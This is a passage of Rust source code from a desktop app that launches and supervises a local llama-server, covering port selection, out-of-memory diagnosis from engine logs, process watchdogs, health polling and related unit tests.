    for pid in pids {
        if pid == me {
            continue;
        }
        let args = run_capture("ps", &["-p", &pid.to_string(), "-o", "command="]);
        if args.contains("llama-server") && args.contains(&root_str) {
            let _ = Command::new("kill").arg("-9").arg(pid.to_string()).status();
        }
    }
}

fn pick_free_port() -> Result<u16, String> {
    use std::net::TcpListener;
    for offset in 0..SERVER_PORT_SPAN {
        let port = SERVER_PORT_BASE + offset;
        match TcpListener::bind(("127.0.0.1", port)) {
            Ok(l) => {
                drop(l); // released immediately; llama-server takes it next
                return Ok(port);
            }
            Err(_) => continue,
        }
    }
    Err(format!(
        "no free port in {}..{}",
        SERVER_PORT_BASE,
        SERVER_PORT_BASE + SERVER_PORT_SPAN
    ))
}

/// Last lines of llama-server.log, attached to failure events so the UI can
/// show why the engine died.
fn server_log_tail(lines: usize) -> String {
    std::fs::read_to_string(app_support().join("llama-server.log"))
        .map(|t| {
            t.lines()
                .rev()
                .take(lines)
                .collect::<Vec<_>>()
                .into_iter()
                .rev()
                .collect::<Vec<_>>()
                .join("\n")
        })
        .unwrap_or_default()
}

// ------------------------------------------- reading the engine's own words
//
// "Compute error." is what llama-server says when llama_decode returns below
// -1: the graph did not run. The message names no cause, and memory is only
// one of the things that can produce it, so the string alone cannot be turned
// into advice without guessing.
//
// The engine does say more, one line earlier, in its own log. That is what is
// read here instead.

/// Substrings that mean an allocator refused. Matched lowercase, against the
/// log, never against the API message.
///
/// Where each one comes from, so a llama.cpp bump can be checked against this
/// list rather than trusted:
///   ggml-alloc.c        "not enough space in the buffer to allocate ..."
///   ggml-backend.cpp    "failed to allocate buffer, size = ..."
///   ggml-metal-device.m "failed to allocate context", "greater than the
///                        recommended max working set size"
///   Metal itself        the command buffer's localizedDescription, which for
///                        a GPU allocation failure reads "Insufficient Memory
///                        (00000008:kIOGPUCommandBufferCallbackErrorOutOfMemory)"
///   libc                strerror(ENOMEM), "Cannot allocate memory"
const OOM_MARKERS: [&str; 8] = [
    "failed to allocate",
    "unable to allocate",
    "cannot allocate memory",
    "not enough space in the buffer",
    "out of memory",
    "outofmemory",
    "insufficient memory",
    "greater than the recommended max working set size",
];

/// Substrings that prove the log line came from a decode that gave up, so the
/// current log can be told apart from one that simply has nothing to say.
const DECODE_FAILURE_MARKERS: [&str; 4] = [
    "compute error",
    "invalid input batch",
    "command buffer",
    "context size has been exceeded",
];

/// What the engine's words say about a failure the user just met.
///
/// `memory`  the allocator refused, and the one action that works is to give
///           the engine less to hold.
/// `context` the conversation outgrew the window. Not a memory problem, and
///           telling the user to switch to Eco would send them the wrong way.
/// `unknown` the log names neither. Say so rather than invent a cause.
fn classify_engine_failure(api_message: &str, log: &str) -> &'static str {
    let msg = api_message.to_lowercase();
    // Checked FIRST: an exceeded context can happen on a machine with memory
    // to spare, and the two remedies point in opposite directions.
    if msg.contains("context size has been exceeded")
        || msg.contains("exceed the available context")
        || msg.contains("context shift")
    {
        return "context";
    }
    let low = log.to_lowercase();
    if OOM_MARKERS.iter().any(|m| low.contains(m)) {
        return "memory";
    }
    "unknown"
}

/// The engine log worth classifying.
///
/// llama-server.log is the running engine; the `.1` beside it is the previous
/// run, kept because a failed start is usually reported after the user has
/// already retried. When the current log holds no trace of a decode giving up,
/// the evidence is in the older one, and reading only the current file would
/// report "unknown" on the exact case this exists for.
fn engine_log_evidence() -> String {
    let current = read_log_tail("llama-server.log");
    let low = current.to_lowercase();
    let speaks = DECODE_FAILURE_MARKERS.iter().any(|m| low.contains(m))
        || OOM_MARKERS.iter().any(|m| low.contains(m));
    if speaks {
        return current;
    }
    let previous = read_log_tail("llama-server.log.1");
    if previous.is_empty() { current } else { previous }
}

/// Last quarter of a megabyte of an engine log.
///
/// A long session writes a log measured in tens of megabytes, and the verdict
/// is always in its last handful of lines. Reading the whole file to look at
/// its tail would make diagnosing a failure cost more than the failure.
fn read_log_tail(name: &str) -> String {
    use std::io::{Read, Seek, SeekFrom};
    const WINDOW: u64 = 256 * 1024;
    let Ok(mut f) = std::fs::File::open(app_support().join(name)) else {
        return String::new();
    };
    let len = f.metadata().map(|m| m.len()).unwrap_or(0);
    if len > WINDOW && f.seek(SeekFrom::Start(len - WINDOW)).is_err() {
        return String::new();
    }
    let mut buf = Vec::new();
    if f.read_to_end(&mut buf).is_err() {
        return String::new();
    }
    String::from_utf8_lossy(&buf).into_owned()
}

/// The engine's own line that carries the verdict, so what the UI shows is
/// evidence rather than a claim. Empty when the log names nothing.
fn engine_failure_evidence(log: &str) -> String {
    log.lines()
        .rev()
        .find(|l| {
            let low = l.to_lowercase();
            OOM_MARKERS.iter().any(|m| low.contains(m))
        })
        .map(|l| l.trim().chars().take(240).collect())
        .unwrap_or_default()
}

/// What the UI needs to replace "Compute error." with a sentence.
#[derive(Serialize, Clone, Debug)]
struct EngineDiagnosis {
    /// memory | context | unknown
    kind: String,
    /// The footprint mode the running engine was started in ("" when stopped).
    mode: String,
    /// Whether there is a leaner mode left to fall back to. False in eco,
    /// where the honest advice is to free memory instead.
    can_step_down: bool,
    /// The engine's own line, shown so the diagnosis can be checked.
    evidence: String,
    /// The raw engine message, passed through for the unknown case.
    message: String,
}

/// Diagnose a failure the user just met in a conversation.
///
/// Called from the chat error path with the message llama-server sent. The
/// classification reads the engine log rather than pattern-matching the
/// message, because the message is the same three words whatever happened.
///
/// Async so the log read never runs on the main thread: this is called at the
/// exact moment the machine is short of memory and the UI must stay alive.
#[tauri::command]
async fn engine_diagnose(message: String) -> EngineDiagnosis {
    let log = engine_log_evidence();
    let kind = classify_engine_failure(&message, &log);
    let mode = {
        let s = server_state().lock().unwrap_or_else(|e| e.into_inner());
        s.footprint.as_ref().map(|f| f.mode.clone()).unwrap_or_default()
    };
    EngineDiagnosis {
        can_step_down: !mode.is_empty() && mode != "eco",
        kind: kind.to_string(),
        mode,
        evidence: if kind == "memory" { engine_failure_evidence(&log) } else { String::new() },
        message,
    }
}

#[cfg(test)]
mod chat_parsing_tests {
    use super::{bit_exact_numerics, chat_parsing_args};

    #[test]
    fn the_engine_is_told_to_separate_thinking_from_the_answer() {
        // Without this pair the thoughts either never leave `content` or are
        // re-inlined into it, and the app is back to showing nothing while a
        // model reasons for half a minute.
        let args = chat_parsing_args();
        let at = args
            .iter()
            .position(|a| *a == "--reasoning-format")
            .expect("the engine must be told which reasoning format to use");
        assert_eq!(
            args.get(at + 1),
            Some(&"deepseek"),
            "the value has to follow the flag, or llama-server reads the next flag as it"
        );
    }

    #[test]
    fn the_legacy_format_is_never_the_one_asked_for() {
        // deepseek-legacy extracts the thoughts AND re-inlines them into the
        // content while streaming, which puts raw <think> tags back on screen.
        // It reads like a harmless synonym and is the one wrong answer here.
        assert!(
            !chat_parsing_args().contains(&"deepseek-legacy"),
            "deepseek-legacy re-inlines thinking into the streamed content"
        );
    }

    #[test]
    fn the_template_engine_stays_on() {
        // The reasoning format is only consulted on the jinja path: without
        // --jinja the server never runs the parser that fills reasoning_content.
        assert!(chat_parsing_args().contains(&"--jinja"));
    }

    #[test]
    fn certified_numerics_are_given_up_only_on_purpose() {
        // The default, and every way of not having chosen.
        assert!(bit_exact_numerics(None));
        assert!(bit_exact_numerics(Some("")));
        assert!(bit_exact_numerics(Some("   ")));
        assert!(bit_exact_numerics(Some("bitexact")));
        // A value some future version writes, or a typo, must not silently cost
        // the user certified numerics.
        assert!(bit_exact_numerics(Some("standrad")));
        assert!(bit_exact_numerics(Some("fast")));
        // The one word that gives it up, whitespace tolerated.
        assert!(!bit_exact_numerics(Some("standard")));
        assert!(!bit_exact_numerics(Some(" standard ")));
    }

    #[test]
    fn the_cli_server_is_started_with_the_same_parsing_flags_as_the_app() {
        // `galactus serve` passed --jinja alone. Without --reasoning-format
        // deepseek the engine leaves the thinking inside message.content, so a
        // client pointed at the CLI's server got <think> tags mixed into the
        // answer while the app, on the same model, separated them.
        //
        // Read from the source rather than asserted about a string, because
        // what went wrong was a second copy of the list drifting from the
        // first, and a test with its own third copy would not have caught it.
        let cli = include_str!("cli.rs");
        assert!(
            cli.contains("crate::chat_parsing_args()"),
            "serve must take its parsing flags from the one function that defines them"
        );
        assert!(
            !cli.contains(".arg(\"--jinja\")"),
            "and must not carry its own copy of any of them"
        );
    }
}

#[cfg(test)]
mod engine_failure_tests {
    use super::classify_engine_failure;

    /// What a real Metal allocation failure leaves behind, trimmed.
    const METAL_OOM: &str = "\
ggml_metal_synchronize: error: command buffer 0 failed with status 5
error: Insufficient Memory (00000008:kIOGPUCommandBufferCallbackErrorOutOfMemory)
srv  update_slots: Compute error. off = 0, n_batch = 512, ret = -3";

    #[test]
    fn the_allocator_refusing_is_named_memory() {
        assert_eq!(classify_engine_failure("Compute error.", METAL_OOM), "memory");
    }

    #[test]
    fn the_ggml_allocator_message_counts_too() {
        let log = "ggml_gallocr_reserve_n: not enough space in the buffer to allocate 1073741824 bytes";
        assert_eq!(classify_engine_failure("Compute error.", log), "memory");
    }

    #[test]
    fn an_exceeded_context_is_never_reported_as_memory() {
        // The remedies point opposite ways: this one is answered by a shorter
        // conversation, not by a smaller footprint. Even with an old memory
        // line still sitting in the log, the message decides.
        assert_eq!(
            classify_engine_failure("Context size has been exceeded.", METAL_OOM),
            "context"
        );
    }

    #[test]
    fn a_failure_the_log_does_not_explain_stays_unknown() {
        // Inventing a memory story here would send the user to Settings for
        // nothing, and would hide the real fault.
        let log = "srv  update_slots: Compute error. off = 0, n_batch = 512, ret = -3";
        assert_eq!(classify_engine_failure("Compute error.", log), "unknown");
        assert_eq!(classify_engine_failure("Compute error.", ""), "unknown");
    }
}

// Async: pack resolution and the port scan touch disks and sockets, which
/// Proof that a llama-server carries the Galactus engine, not just its flags.
///
/// The engine code is linked into the llama library, so the marker is looked up
/// in the binary AND in the llama/ggml dylibs beside it. A stock upstream build
/// silently ignores every GALACTUS_H4_* variable and would serve the model
/// natively, which is exactly what the product forbids: fail closed instead.
fn engine_is_wired(bin: &Path) -> Result<(), String> {
    const MARKER: &[u8] = b"galactus_h4:";
    let mut candidates: Vec<PathBuf> = vec![bin.to_path_buf()];
    if let Some(dir) = bin.parent() {
        for probe in [dir.to_path_buf(), dir.join("../lib")] {
            if let Ok(entries) = std::fs::read_dir(&probe) {
                for e in entries.flatten() {
                    let p = e.path();
                    let name = p.file_name().unwrap_or_default().to_string_lossy().to_string();
                    if name.ends_with(".dylib") && (name.contains("llama") || name.contains("ggml")) {
                        candidates.push(p);
                    }
                }
            }
        }
    }
    for path in candidates {
        let Ok(bytes) = std::fs::read(&path) else { continue };
        if bytes.windows(MARKER.len()).any(|w| w == MARKER) {
            return Ok(());
        }
    }
    Err(format!(
        "this llama-server has no Galactus engine ({}): it would run the model natively, \
         without the expert cache and without the certified numerics. Rebuild it with the patch:\n  \
         patches/appliquer.sh third_party/llama.cpp && cmake --build third_party/llama.cpp/build --target llama-server -j",
        bin.display()
    ))
}

// must not run on the main thread.
#[tauri::command]
async fn server_start(app: AppHandle, model_id: String, cache_gb: Option<u64>) -> Result<(), String> {
    // One start at a time, and the second caller is TOLD rather than queued.
    //
    // Two clicks on two cards ran two of these concurrently, and the window
    // between spawning the engine and taking the state lock includes launching
    // a watchdog shell: the second start's stop could land inside it, leaving
    // the first process alive with the whole model resident and nothing
    // pointing at it.
    //
    // A blocking mutex would be wrong here: this function awaits, and holding a
    // std lock across an await parks a runtime worker and invites a deadlock.
    // An atomic that refuses is also the better behaviour, since loading a
    // model takes minutes and a silently queued second start is a surprise.
    static STARTING: AtomicBool = AtomicBool::new(false);
    if STARTING.swap(true, Ordering::SeqCst) {
        return Err("a model is already starting: wait for it, or stop it first".into());
    }
    struct Done;
    impl Drop for Done {
        fn drop(&mut self) {
            STARTING.store(false, Ordering::SeqCst);
        }
    }
    // Released on every path out, including the early returns and a panic.
    let _done = Done;
    let root = galactus_root()?;
    let entry = registry_entry(&root, &model_id)?;
    require_certified_model(&entry)?;
    require_compatible_hardware(&entry, hw_info_impl().ram_gb)?;
    let (model_dir, _pack, profile) = model_paths(&root, &model_id);
    let gguf = find_gguf(&model_dir).ok_or("model GGUF not found")?;
    // Dual-pack resolution: two distinct paths make the engine split every
    // record across both SSDs and read them in parallel (P0v2); identical
    // paths are the classic mono pack.
    let dense = is_dense(&entry);
    let (pack_internal, pack_external) = resolve_packs(&root, &model_id, &entry)?;
    // A dense model has no pack and never will: demanding one here would refuse
    // to start a model whose weights are sitting on disk, complete.
    if !dense && (!pack_internal.is_file() || !pack_external.is_file()) {
        return Err("pack not found, install the model first".into());
    }

    let settings = settings_load();
    let override_gb = cache_gb.or_else(|| {
        settings
            .get("cache_gb")
            .and_then(|s| s.trim().parse::<u64>().ok())
    });
    let ram_gb = hw_info_impl().ram_gb.max(8);
    let ram_mode = settings
        .get("ram_mode")
        .map(|s| s.as_str())
        .filter(|s| matches!(*s, "eco" | "balanced" | "perf"))
        .unwrap_or("balanced")
        .to_string();
    // Needed before planning: the cross-check regime keeps a small micro-batch.
    let cpu_moe = entry["cpu_moe"].as_bool().unwrap_or(false)
        || settings.get("cpu_moe").map(|v| v == "1").unwrap_or(false);
    // What the Mac can hand over RIGHT NOW, measured a moment before the
    // engine starts allocating, and what Metal will let it hold resident. The
    // first is the whole reason the planner can step down; the second is the
    // bound the allocator answers to.
    let machine = MachineLimits::probe(ram_gb);
    // Resolved BEFORE planning: every slot past the first is a whole extra KV
    // cache, and the plan has to pay for the slots this start will really ask
    // llama-server for. Per model and per machine, not a flat two.
    let slots = crate::planner::resolved_slots(&entry, machine, &ram_mode, cpu_moe);
    // The window the engine will really be started with, resolved once and used
    // both to price the plan and to build --ctx-size. They were two separate
    // reads for one release, and the plan priced a window the engine did not get.
    let ctx_per_slot = crate::planner::ctx_per_slot_for(&entry);
    let plan = crate::planner::plan_cache(&entry, machine, override_gb, &ram_mode, cpu_moe, slots, ctx_per_slot)?;
    let (cache_bytes, fraction, ubatch) = (plan.cache_bytes, plan.protected, plan.ubatch);

    // Engine resolution: a developer checkout build wins (always freshest);
    // otherwise the fully relocated llama-server shipped INSIDE the app
    // bundle is used, no Homebrew, no checkout, plug and play.
    let checkout_bin = root.join("third_party/llama.cpp/build/bin/llama-server");
    let server_bin = if checkout_bin.exists() {
        checkout_bin
    } else if let Some(bundled) = bundled_engine() {
        bundled
    } else {
        return Err("llama-server binary not found, build it: cmake --build third_party/llama.cpp/build --target llama-server -j".into());
    };
    // Product law: a certified model NEVER runs as a plain native llama.cpp.
    // A stock build accepts every flag and ignores every GALACTUS_H4_* var, so
    // it would serve the model natively while the app reported the engine
    // regime. Prove the wiring is linked in before spawning anything.
    //
    // A dense model is exempt because it makes no such claim: it has no pack, no
    // expert records, and its registry status says stock_unmodified. Demanding
    // the marker there refuses to serve a model that a stock binary serves
    // correctly, which is a refusal with nothing behind it.
    if !dense {
        engine_is_wired(&server_bin)?;
    }

    // A sidecar generated by the installer is mandatory whenever profile.json
    // exists. Check it before replacing a healthy server.
    let has_engine_profile = profile.is_file();
    if !has_engine_profile && model_dir.join("profile.json").is_file() {
        return Err(format!(
            "engine profile missing: {} (regenerate it with scripts/moe-profile.py, \
             or reinstall the model)",
            profile.display()
        ));
    }

    // Every deterministic preflight has succeeded. Only now may this request
    // replace the active server.
    server_stop_impl()?;
    // The generation to beat, read AFTER that stop and not before it.
    //
    // WHY THE ORDER IS THE WHOLE FIX. `server_stop_impl` bumps this counter,
    // which is what lets a Stop reach a start that has not spawned anything
    // yet. Reading the counter at the top of this function therefore compared
    // against a value that this function's OWN internal stop had already
    // invalidated, so the check below fired on every start and every model
    // refused to load with "cancelled". Read here, the only thing that can
    // move it is a Stop the user pressed during the slow part that follows:
    // the engine binary and every dylib read to verify the patches, the
    // machine probe, the cache plan, which together are the seconds where
    // Stop used to do nothing at all.
    let entry_gen = SERVER_GEN.load(Ordering::SeqCst);
    reap_orphan_servers(&root);
    let port = pick_free_port()?;

    // Keep the server's output so failures are visible instead of hanging.
    // The PREVIOUS run is kept alongside: a failed start is usually reported
    // after the user has already retried, and truncating on every start
    // destroyed the only evidence of what actually failed.
    let log_path = app_support().join("llama-server.log");
    let _ = std::fs::create_dir_all(app_support());
    let _ = std::fs::rename(&log_path, app_support().join("llama-server.log.1"));
    let log_out = std::fs::File::create(&log_path).map_err(|e| e.to_string())?;
    let log_err = log_out.try_clone().map_err(|e| e.to_string())?;

    // Engine regime, ALWAYS the H4 wiring, ALWAYS the certified numerics.
    //
    // Certification rule (product law): a certified model runs BIT-EXACT.
    // That is the CPU-experts regime the certification benches validated:
    // the upstream Metal mv_id kernels diverge from CPU truth on iq quants
    // (patch comment, probe v4: 1-2% relative per layer; ppl 8.89 vs 2.67 on
    // GLM at 1.58 bpw), so Metal experts are OPT-IN and explicitly outside
    // the certification envelope ("metal_experts": true in the registry
    // entry, or setting metal_experts=1).
    //
    // The physical micro-batch stays at the planner's guarded value: the
    // certified curves were measured in this envelope, and a different batch
    // shape changes kernel paths and accumulation order, do not trade
    // bit-exactness for prompt speed silently.
    // Residency is judged on the SAME geometry the planner used (the profile
    // measured at install when there is one), not on the registry estimate:
    // the two can drift and the badge would then contradict the plan.
    let expert_total = crate::planner::measured_geometry(&entry)
        .map(|g| g.1)
        .unwrap_or_else(|| entry["expert_bytes_total"].as_u64().unwrap_or(u64::MAX));
    let full_residency = cache_bytes >= expert_total;
    // The Metal parity path (patches 0002-0004) now covers EVERY expert quant
    // type of the certified registry (iq1_s..q3_K, q8_0, q5_0, q4_K, q6_K,
    // mxfp4), verified 32768/32768 identical bits by the parity probe: Metal
    // experts ARE the certified numerics, and the default everywhere. CPU
    // experts stay as an explicit cross-check regime ("cpu_moe": true per
    // model, or setting cpu_moe=1). Resolved before planning, above.
    let metal_experts = !cpu_moe;
    // Whether the Metal expert kernels replay the CPU algorithm bit for bit, or
    // run llama.cpp's own mul_mat_id.
    //
    // WHY THIS IS A CHOICE AND NOT A CONSTANT. The parity path is correct and
    // it is verified, but replaying a CPU algorithm on a GPU cannot reach the
    // throughput of a kernel written for the GPU, and the cost is enormous. It
    // falls almost entirely on prompt ingestion, which is why generation
    // benchmarks never showed it.
    //
    // MEASURED, same model, same prompt, same micro-batch of 512, olmoe-1b-7b
    // (q4_K / q6_K experts), 3061 tokens, the flag as the only difference:
    //
    //     bit-exact      147 tok/s prefill      74-108 tok/s decode
    //     standard      5567-8584 tok/s        187-225 tok/s decode
    //
    // Prefill is 38 to 58 times slower on the parity path; the same 3061 tokens
    // take 20.6 seconds instead of 0.36. On a working session with
    // gpt-oss-120b (mxfp4) the symptom is the same shape: 171 tok/s of prefill
    // against 40 of decode, a ratio of 4.3 where a Metal MoE should be ten to
    // thirty. The magnitude on mxfp4 is not measured here and may differ.
    //
    // The default stays bit-exact, because that is the promise the rest of this
    // file is built on and nobody should lose it by upgrading. `numerics =
    // standard` is the user saying, explicitly, that they would rather have the
    // speed. It is per-machine, it survives a restart, and the badge says which
    // regime is running so the choice is never invisible.
    let bit_exact = bit_exact_numerics(settings.get("numerics").map(|v| v.as_str()));
    let eff_ubatch: u32 = ubatch;

    let mut cmd = Command::new(&server_bin);
    cmd.env("LC_ALL", "C");
    // The streaming layer is what makes a model larger than memory possible, and
    // it substitutes expert tensors to do it. A dense model has none, so setting
    // these would point the engine at a pack that does not exist. It runs as
    // plain llama.cpp here, which is the whole reason its card says so.
    if !dense {
        cmd.env("GALACTUS_H4", "1")
            .env("GALACTUS_H4_INTERNAL", &pack_internal)
            .env("GALACTUS_H4_EXTERNAL", &pack_external)
            .env("GALACTUS_H4_CACHE_BYTES", cache_bytes.to_string())
            .env("GALACTUS_H4_PROTECTED", format!("{fraction:.2}"))
            .env("GALACTUS_H4_QD", "32");
    }
    // Without GALACTUS_PROFILE the engine adopts its builtin GLM-5.2 geometry.
    // That is right for GLM-5.2 itself and wrong for every other model, so the
    // sidecar is mandatory as soon as the install produced a profile: a
    // renamed or deleted profile.engine.txt would otherwise read experts at
    // the wrong offsets instead of failing.
    if has_engine_profile {
        cmd.env("GALACTUS_PROFILE", &profile);
    }
    // The split ratio the install recorded for this model, handed to the
    // engine as a CROSS-CHECK. The engine cuts by the .split record the pack
    // writer left beside the pack; this is the app's independent copy of the
    // same number, and the engine refuses to start when the two disagree
    // rather than reading one of the two volumes at the wrong offset. Only
    // dual installs have it: a mono pack has nothing to split.
    if pack_internal != pack_external {
        if let Some(r) = settings
            .get(&format!("pack_ratio_{model_id}"))
            .map(|v| v.trim())
            .filter(|v| !v.is_empty())
        {
            cmd.env("GALACTUS_H4_RATIO", r);
        }
    }
    if cpu_moe {
        cmd.env("GALACTUS_H4_CPU_MOE", "1");
    } else if bit_exact {
        // Metal experts run through the bit-exact parity path (patches 0002 +
        // 0003): the Metal mul_mat_id replays the CPU algorithm bit for bit
        // for every expert quant type of the flagged models. Certified
        // numerics on the GPU.
        cmd.env("GALACTUS_METAL_BITEXACT", "1");
    }
    // Slots and window: --ctx-size is the TOTAL KV budget and llama-server
    // divides it by --parallel, so it is scaled with the slot count. Splitting
    // a fixed 8192 instead would silently give a two-conversation user a
    // 4096-token window per thread.
    //
    // `slots` was resolved before planning, and must stay the same number: the
    // engine has to be started with exactly the slot count the ceiling paid for.
    // The window the planner sized the memory for, not the constant: the two
    // must be the same number or the engine is started with a cache the ceiling
    // never accounted for.
    let ctx_total = ctx_per_slot * slots;
    cmd.arg("--model")
        .arg(&gguf)
        .arg("--host")
        .arg("127.0.0.1")
        .arg("--port")
        .arg(port.to_string())
        .arg("--ctx-size")
        .arg(ctx_total.to_string())
        .arg("--n-gpu-layers")
        .arg("99")
        .arg("--no-repack")
        .arg("--fit")
        .arg("off")
        .arg("--no-mmap");
    if cpu_moe {
        cmd.arg("--n-cpu-moe").arg("99");
    }
    // Logical batch stays normal (the server sizes its output buffers from
    // it, a tiny value asserts in output_reserve). Only the PHYSICAL
    // micro-batch is constrained by the expert-cache probation guard.
    cmd.arg("--batch-size")
        .arg("512")
        .arg("--ubatch-size")
        .arg(eff_ubatch.to_string())
        // One slot per conversation the app is allowed to run at once.
        .arg("--parallel")
        .arg(slots.to_string())
        .args(chat_parsing_args())
        .stdout(Stdio::from(log_out))
        .stderr(Stdio::from(log_err));
    let mut child = cmd.spawn().map_err(|e| format!("spawn llama-server: {e}"))?;
    // Did somebody press Stop while all of the above was running?
    if SERVER_GEN.load(Ordering::SeqCst) != entry_gen {
        let _ = child.kill();
        let _ = child.wait();
        return Err("cancelled".into());
    }

    // Watchdog: the engine must die WITH the app in every death mode (crash,
    // force quit, kill -9), not only on the clean RunEvent::Exit path. A tiny
    // detached shell outlives us, watches our PID, and kills the server when
    // we are gone. It verifies the command name first so PID reuse can never
    // make it kill an unrelated process.
    {
        let app_pid = std::process::id();
        let srv_pid = child.id();
        let _ = Command::new("/bin/zsh")
            .arg("-c")
            .arg(format!(
                // It watches BOTH pids and leaves when either is gone. Watching
                // only the app meant one of these shells survived every model
                // change and every stop, waking up every three seconds until
                // the app closed: twenty models tried in a session left twenty
                // of them behind.
                "while kill -0 {app_pid} 2>/dev/null && kill -0 {srv_pid} 2>/dev/null; do sleep 3; done; \
                 if kill -0 {app_pid} 2>/dev/null; then exit 0; fi; \
                 if ps -p {srv_pid} -o comm= 2>/dev/null | grep -q llama-server; then \
                   kill {srv_pid} 2>/dev/null; sleep 2; kill -9 {srv_pid} 2>/dev/null; fi"
            ))
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn();
    }

    let generation = SERVER_GEN.fetch_add(1, Ordering::SeqCst) + 1;
    {
        let mut s = server_state().lock().unwrap_or_else(|e| e.into_inner());
        // The same question as after the spawn, asked again under the lock so
        // that a Stop landing in the window between the two cannot be lost:
        // from here on the child is in the state and Stop can reach it itself.
        if generation != entry_gen + 1 {
            drop(s);
            let _ = child.kill();
            let _ = child.wait();
            return Err("cancelled".into());
        }
        s.child = Some(child);
        s.model_id = Some(model_id.clone());
        // Both expert paths are bit-exact, so the regime worth showing is the
        // residency one: it is what tells the user the model runs in a
        // fraction of its own size. CPU experts stay named, being the
        // cross-check regime rather than the default.
        s.mode = if dense {
            // Named for what it is. Every other regime here is a claim about
            // expert numerics; this one has no experts and makes no such claim.
            "stock-llamacpp".into()
        } else if !metal_experts {
            "cpu-bit-exact".into()
        } else if !bit_exact {
            // The user chose speed over the parity path. The name says so,
            // because a badge that still read "bit-exact" would be a claim this
            // engine is no longer making.
            if full_residency { "resident-fast".into() } else { "streamed-fast".into() }
        } else if full_residency {
            "resident-bit-exact".into()
        } else {
            "streamed-bit-exact".into()
        };
        s.phase = "starting".into();
    // Verdict of the PREVIOUS model: it says nothing about this one.
    s.tools_ok = None;
        s.generation = generation;
        s.port = port;
        s.slots = slots;
        s.ctx_per_slot = ctx_per_slot;
        s.footprint = Some(plan.decision.clone());
    }
    let _ = app.emit(
        "galactus://server",
        json!({"phase": "starting", "footprint": plan.decision}),
    );

    // Health poller: big models can take minutes to warm the arena. It also
    // watches for the process dying, so a broken server surfaces its error
    // instead of leaving the UI on "starting" forever.
    std::thread::spawn(move || {
        let deadline = Instant::now() + Duration::from_secs(900);
        loop {
            if Instant::now() > deadline {
                break;
            }
            std::thread::sleep(Duration::from_millis(1000));
            {
                let mut s = server_state().lock().unwrap_or_else(|e| e.into_inner());
                if s.generation != generation || s.child.is_none() {
                    return;
                }
                // Did it exit already? Then it failed to load.
                if let Some(child) = s.child.as_mut() {
                    if let Ok(Some(status)) = child.try_wait() {
                        let tail = server_log_tail(12);
                        // The engine's own verdict, so a start that died for
                        // want of memory says so instead of handing the user
                        // twelve lines of log to interpret.
                        let kind = classify_engine_failure("", &engine_log_evidence());
                        s.child = None;
                        s.phase = "failed".into();
                        drop(s);
                        let _ = app.emit(
                            "galactus://server",
                            json!({"phase": "failed",
                                   "code": status.code(),
                                   "kind": kind,
                                   "log": tail}),
                        );
                        return;
                    }
                }
            }
            let ok = Command::new("curl")
                .args([
                    "-s",
                    "-o",
                    "/dev/null",
                    "-w",
                    "%{http_code}",
                    "--max-time",
                    "2",
                    &format!("http://127.0.0.1:{port}/health"),
                ])
                .output()
                .map(|o| String::from_utf8_lossy(&o.stdout).trim() == "200")
                .unwrap_or(false);
            if ok {
                // /health goes 200 once the non-expert weights are up, but the
                // real load (graph + Metal pipelines + first experts) only
                // happens on the first inference. Force it NOW with a tiny
                // generation so "ready" means actually ready, instead of the
                // first user message eating the whole warmup.
                {
                    let s = server_state().lock().unwrap_or_else(|e| e.into_inner());
                    if s.generation != generation {
                        return;
                    }
                }
                let _ = Command::new("curl")
                    .args([
                        "-s",
                        "-o",
                        "/dev/null",
                        "--max-time",
                        "600",
                        "-H",
                        "Content-Type: application/json",
                        "-d",
                        r#"{"model":"galactus-local","messages":[{"role":"user","content":"ok"}],"max_tokens":4,"stream":false}"#,
                    ])
                    .arg(format!("http://127.0.0.1:{port}/v1/chat/completions"))
                    .output();
                let mut s = server_state().lock().unwrap_or_else(|e| e.into_inner());
                // Stopped or swapped during the warmup: stay silent.
                if s.generation != generation || s.child.is_none() {
                    return;
                }
                // A crash during the warmup leaves the child unreaped, so
                // is_none() alone would still declare ready on a dead server.
                if let Some(child) = s.child.as_mut() {
                    if let Ok(Some(status)) = child.try_wait() {
                        let tail = server_log_tail(12);
                        // The engine's own verdict, so a start that died for
                        // want of memory says so instead of handing the user
                        // twelve lines of log to interpret.
                        let kind = classify_engine_failure("", &engine_log_evidence());
                        s.child = None;
                        s.phase = "failed".into();
                        drop(s);
                        let _ = app.emit(
                            "galactus://server",
                            json!({"phase": "failed",
                                   "code": status.code(),
                                   "kind": kind,
                                   "log": tail}),
                        );
                        return;
                    }
                }
                s.phase = "ready".into();
                drop(s);
                let _ = app.emit("galactus://server", json!({"phase": "ready"}));

                // The tool probe runs AFTER ready is announced, never before.
                // It costs one short generation, and holding the UI on
                // "starting" for it would make a model that works perfectly
                // for chat look slower to load than it is. The agent surfaces
                // read `tools_ok` and stay disabled while it is still None.
                let verdict = probe_tool_calling(port);
                let mut s = server_state().lock().unwrap_or_else(|e| e.into_inner());
                if s.generation != generation || s.child.is_none() {
                    return;
                }
                s.tools_ok = verdict;
                drop(s);
                let _ = app.emit(
                    "galactus://server",
                    json!({"phase": "ready", "tools_ok": verdict}),
                );
                return;
            }
        }
        // Deadline passed: kill the stuck server so the state cannot claim
        // "starting" forever with a process nobody can reach.
        {
            let mut s = server_state().lock().unwrap_or_else(|e| e.into_inner());
            if s.generation == generation {
                if let Some(mut child) = s.child.take() {
                    let _ = child.kill();
                    let _ = child.wait();
                }
                s.phase = "failed".into();
            }
        }
        let _ = app.emit("galactus://server", json!({"phase": "timeout"}));
    });
    Ok(())
}

// Async: child.wait() can block for the whole engine teardown.
#[tauri::command]
async fn server_stop() -> Result<(), String> {
    server_stop_impl()
}

fn server_stop_impl() -> Result<(), String> {
    // The child comes OUT of the lock before it is killed and waited on.
    //
    // Tearing down an engine holding ninety gigabytes is not instant, and the
    // lock was held for the whole of it. server_status wants the same lock and
    // is called from the UI on every tick, so stopping a large model froze the
    // window until the process was gone.
    let child = {
        let mut s = server_state().lock().unwrap_or_else(|e| e.into_inner());
        // A start already in flight belongs to the generation before this one,
        // so bumping here is how Stop reaches a model that has not been spawned
        // yet. Without it, the preamble of server_start (reading llama-server
        // and every dylib to check the patches, probing the machine, planning
        // the cache) runs for seconds during which Stop found `child == None`,
        // did nothing at all, and the ninety gigabyte model finished loading
        // as if nobody had asked.
        s.generation = SERVER_GEN.fetch_add(1, Ordering::SeqCst) + 1;
        let taken = s.child.take();
        s.model_id = None;
        s.mode = String::new();
        s.phase = "stopped".into();
        s.port = 0;
        s.ctx_per_slot = 0;
        // The decision described a process that no longer exists: keeping it
        // would let the UI report a footprint for nothing.
        s.footprint = None;
        taken
    };
